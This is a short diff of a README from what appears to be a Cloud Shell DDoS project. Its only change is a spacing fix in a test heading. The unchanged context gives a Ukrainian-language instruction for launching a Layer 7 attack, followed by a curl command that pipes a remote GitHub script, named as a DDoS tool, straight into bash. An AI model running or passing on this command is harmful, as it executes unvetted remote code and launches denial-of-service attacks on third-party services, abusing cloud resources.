@@ -3,7 +3,7 @@
 # 
 Making script for durable cloudshell session
 
-#ТЕСТ
+# ТЕСТ
 Командb для запуску атаки 
 по Layer7:
 curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Test_L7m.sh | bash
